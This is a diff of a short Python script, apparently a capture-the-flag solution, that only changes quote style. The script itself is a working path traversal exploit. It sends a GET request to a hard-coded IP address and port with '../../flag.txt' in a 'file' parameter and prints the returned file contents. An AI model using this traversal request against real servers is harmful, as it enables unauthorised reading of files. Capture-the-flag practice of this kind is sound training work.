@@ -8,17 +8,17 @@ def get_flag() -> str:
     :return: Flag
     """
 
-    base_url = 'http://62.173.140.174'
+    base_url = "http://62.173.140.174"
     port = 16012
-    path = 'static'
-    query_param = '../../flag.txt'
+    path = "static"
+    query_param = "../../flag.txt"
 
-    response = get(f'{base_url}:{port}/{path}?file={query_param}')
+    response = get(f"{base_url}:{port}/{path}?file={query_param}")
 
     flag = response.text
 
     return flag
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     print(get_flag())
